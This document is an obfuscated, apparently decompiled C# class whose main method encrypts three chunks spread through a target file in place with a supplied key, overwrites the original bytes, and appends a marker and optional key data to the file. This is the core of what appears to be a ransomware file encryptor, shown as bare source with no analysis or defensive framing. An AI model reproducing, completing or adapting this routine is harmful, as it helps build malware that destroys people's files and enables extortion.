using System;
using System.IO;
using System.Text;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;
using zCZInypFvszt;

namespace DFgOqDzZpZe;

internal sealed class UBFsZsHuzIVCuyiH
{
	[NonSerialized]
	internal static GetString getString_0;

	public static int BszOavOjIBAbEA(long long_0)
	{
		return (int)long_0;
	}

	public static bool HAYNDKhQUXPc(string LiKSyBrgQINL, string sTYrvgPbJpdca, string FapYURLvRJyY, byte[] OajjoiPGhMPPCY = null, byte[] SKmWVirTcC = null)
	{
		try
		{
			using (FileStream fileStream = new FileStream(LiKSyBrgQINL, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite))
			{
				int num = BszOavOjIBAbEA(fileStream.Length) / 3;
				if (num < 0)
				{
					num *= -1;
				}
				int num2 = 0;
				try
				{
					num2 = Convert.ToInt32(sTYrvgPbJpdca) * Convert.ToInt32(fileStream.Length) / 100 / 2;
					if (num2 < 0)
					{
						num2 *= -1;
					}
				}
				catch
				{
					num2 = 107374182;
				}
				if (num <= num2 - Convert.ToInt32(sTYrvgPbJpdca) * 1024 * 1024)
				{
					num2 = (num - Convert.ToInt32(sTYrvgPbJpdca) * 1024 * 1024) / 10;
				}
				int mtWHsEvbUczW = (int)Math.Round((double)num2 / 32.0, MidpointRounding.AwayFromZero) * 32;
				byte[] array = null;
				for (int i = 0; i < 3; i++)
				{
					byte[] byte_ = OykWSOsfjqrQ(LiKSyBrgQINL, fileStream, mtWHsEvbUczW, num * i);
					array = (thNrRmMEuvdxhHm.CcJcTYoshtYbPYb ? DlKGxPgDEDy.AxAOLtoppUjMDv(byte_, Convert.FromBase64String(FapYURLvRJyY), SKmWVirTcC) : hLhUwUDAhWMjzuB.kRJzGPxkoWlQg(byte_, Convert.FromBase64String(FapYURLvRJyY), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }));
					sosnuEytpaTXu(LiKSyBrgQINL, fileStream, array, num * i);
				}
			}
			byte[] array2 = null;
			array2 = (thNrRmMEuvdxhHm.dludHStvHyTu ? Encoding.ASCII.GetBytes(thNrRmMEuvdxhHm.ZvzUuZdcuZvZyuA(getString_0(107399034)) + thNrRmMEuvdxhHm.ZvzUuZdcuZvZyuA(getString_0(107400018)) + Convert.ToString(sTYrvgPbJpdca) + thNrRmMEuvdxhHm.ZvzUuZdcuZvZyuA(getString_0(107400018))) : Encoding.ASCII.GetBytes(thNrRmMEuvdxhHm.ZvzUuZdcuZvZyuA(getString_0(107399034)) + thNrRmMEuvdxhHm.ZvzUuZdcuZvZyuA(getString_0(107400059)) + Convert.ToString(sTYrvgPbJpdca) + thNrRmMEuvdxhHm.ZvzUuZdcuZvZyuA(getString_0(107400059))));
			if (!thNrRmMEuvdxhHm.dludHStvHyTu)
			{
				using FileStream fileStream2 = new FileStream(LiKSyBrgQINL, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
				fileStream2.Write(array2, 0, array2.Length);
			}
			else
			{
				using FileStream fileStream3 = new FileStream(LiKSyBrgQINL, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
				fileStream3.Write(OajjoiPGhMPPCY, 0, OajjoiPGhMPPCY.Length);
				fileStream3.Write(array2, 0, array2.Length);
			}
		}
		catch (Exception ex)
		{
			if (thNrRmMEuvdxhHm.MvyzXvhzMsIEWT)
			{
				try
				{
					File.AppendAllText(thNrRmMEuvdxhHm.knClGxGTQzcKgW, getString_0(107387364) + LiKSyBrgQINL + getString_0(107399021) + ex.Message + getString_0(107395983));
				}
				catch (Exception)
				{
				}
			}
			thNrRmMEuvdxhHm.bBKKzTBaLJVhdj++;
			return false;
		}
		thNrRmMEuvdxhHm.ZxYqzVUoLKX++;
		return true;
	}

	public static byte[] OykWSOsfjqrQ(string nhJVrKylJKdBbDK, FileStream ogTAxmTMEOULX, int mtWHsEvbUczW, int pweNSKWaFz = 0)
	{
		byte[] array = new byte[mtWHsEvbUczW];
		ogTAxmTMEOULX.Position = pweNSKWaFz;
		ogTAxmTMEOULX.Read(array, 0, mtWHsEvbUczW);
		return array;
	}

	public static void sosnuEytpaTXu(string sUoaDfDoacY, FileStream TphdyynkSxXktykO, byte[] QrDbjAdyCWG, int glcanincMLGHS = 0)
	{
		TphdyynkSxXktykO.Position = glcanincMLGHS;
		TphdyynkSxXktykO.Write(QrDbjAdyCWG, 0, QrDbjAdyCWG.Length);
	}

	static UBFsZsHuzIVCuyiH()
	{
		Strings.CreateGetStringDelegate(typeof(UBFsZsHuzIVCuyiH));
	}
}
